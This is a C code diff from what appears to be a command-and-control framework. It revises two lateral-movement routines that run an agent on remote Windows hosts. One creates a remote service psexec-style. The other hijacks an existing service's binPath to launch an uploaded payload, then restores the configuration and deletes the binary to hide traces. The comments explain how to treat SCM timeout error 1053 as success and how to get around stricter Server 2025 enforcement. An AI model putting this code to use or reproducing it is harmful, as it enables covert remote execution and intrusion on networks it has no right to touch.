@@ -1099,19 +1099,27 @@ static BOOL _jump_psexec(Buffer *out, const wchar_t *target,
     snprintf(msg, sizeof(msg), "[+] Created service '%s' on %ls\n", rname, target);
     buf_append(out, msg, (DWORD)strlen(msg));
 
-    /* 4. Start service (agent launches as service process).
-     * Agent calls StartServiceCtrlDispatcher in main(), which registers it
-     * as a proper service and prevents SCM from killing the process. */
-    pStartSvc(hSvc, 0, NULL);
+    /* 4. Start service — SCM launches our binary. Agent doesn't register as a
+     * service, so StartServiceW will return after ~30s with error 1053. */
+    BOOL startOk = pStartSvc(hSvc, 0, NULL);
+    DWORD startErr = GetLastError();
 
-    /* Wait for agent to init, register with SCM, and perform key exchange */
-    Sleep(15000);
+    if (!startOk && startErr != 1053) {
+        snprintf(msg, sizeof(msg), "[-] StartService failed (err=%lu)\n", startErr);
+        buf_append(out, msg, (DWORD)strlen(msg));
+        pDeleteSvc(hSvc);
+        pCloseSH(hSvc);
+        pCloseSH(hSCM);
+        pDeleteFile(remotePath);
+        return FALSE;
+    }
 
-    /* 5. Cleanup: delete service + binary */
+    /* 5. Cleanup: delete service entry + binary.
+     * DeleteService marks for deletion — doesn't kill the running process. */
     pDeleteSvc(hSvc);
     pCloseSH(hSvc);
     pCloseSH(hSCM);
-    pDeleteFile(remotePath);
+    pDeleteFile(remotePath);  /* May fail if exe is locked — that's OK */
 
     snprintf(msg, sizeof(msg), "[+] Service started and cleaned up on %ls\n", target);
     buf_append(out, msg, (DWORD)strlen(msg));
@@ -1223,27 +1231,47 @@ static BOOL _jump_scshell(Buffer *out, const wchar_t *target,
     snprintf(msg, sizeof(msg), "[+] Hijacking service '%ls' on %ls\n", svcName, target);
     buf_append(out, msg, (DWORD)strlen(msg));
 
-    /* 5. Change binPath to our payload */
+    /* 5. Change binPath to our payload — keep original service type (SERVICE_NO_CHANGE).
+     * Changing to SERVICE_WIN32_OWN_PROCESS makes SCM on Server 2025 strictly enforce
+     * service lifecycle and kill processes that misbehave. Keeping the original type
+     * (usually SHARE_PROCESS) means SCM is more lenient after timeout. */
     wchar_t newBinPath[512];
     swprintf(newBinPath, 512, L"%%SystemRoot%%\\%hs.exe", rname);
-    pChangeCfg(hSvc, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
+    pChangeCfg(hSvc, SERVICE_NO_CHANGE, SERVICE_DEMAND_START,
                SERVICE_ERROR_IGNORE, newBinPath, NULL, NULL, NULL, NULL, NULL, NULL);
 
-    /* 6. Start service (agent launches as service process) */
-    pStartSvc(hSvc, 0, NULL);
+    /* 6. Start service — SCM launches our binary as a new process.
+     * The agent doesn't register as a service, so SCM will timeout with error 1053
+     * (ERROR_SERVICE_REQUEST_TIMEOUT). This is expected — the process keeps running. */
+    BOOL startOk = pStartSvc(hSvc, 0, NULL);
+    DWORD startErr = GetLastError();
 
-    /* Wait for agent to initialize and register with SCM.
-     * The agent calls StartServiceCtrlDispatcher → ServiceMain →
-     * SetServiceStatus(SERVICE_RUNNING) during this window.
-     * Once registered, SCM won't kill the process when we restore config. */
-    Sleep(15000);
+    /* Error 1053 = service didn't respond in time = EXPECTED (agent never calls
+     * StartServiceCtrlDispatcher). The process was launched and is running. */
+    if (!startOk && startErr != 1053) {
+        snprintf(msg, sizeof(msg), "[-] StartService failed (err=%lu)\n", startErr);
+        buf_append(out, msg, (DWORD)strlen(msg));
+        /* Restore and bail */
+        pChangeCfg(hSvc, origSvcType, origStartType,
+                   SERVICE_ERROR_IGNORE, origBinPath, NULL, NULL, NULL, NULL, NULL, NULL);
+        pCloseSH(hSvc);
+        pCloseSH(hSCM);
+        pDeleteFile(remotePath);
+        return FALSE;
+    }
 
-    /* 7. DIAGNOSTIC: skip ALL cleanup to test if agent survives.
-     * TODO: re-enable once we confirm the agent stays alive without cleanup. */
+    /* 7. Restore original binPath immediately — agent process is already running.
+     * This matches the Adaptix scshell approach: restore before cleanup. */
+    pChangeCfg(hSvc, origSvcType, origStartType,
+               SERVICE_ERROR_IGNORE, origBinPath, NULL, NULL, NULL, NULL, NULL, NULL);
+
     pCloseSH(hSvc);
     pCloseSH(hSCM);
 
-    snprintf(msg, sizeof(msg), "[+] Service started on %ls (cleanup deferred)\n", target);
+    /* 8. Delete uploaded binary — it's already loaded in memory by the agent process */
+    pDeleteFile(remotePath);
+
+    snprintf(msg, sizeof(msg), "[+] Service started on %ls (agent running as PID)\n", target);
     buf_append(out, msg, (DWORD)strlen(msg));
     return TRUE;
 }
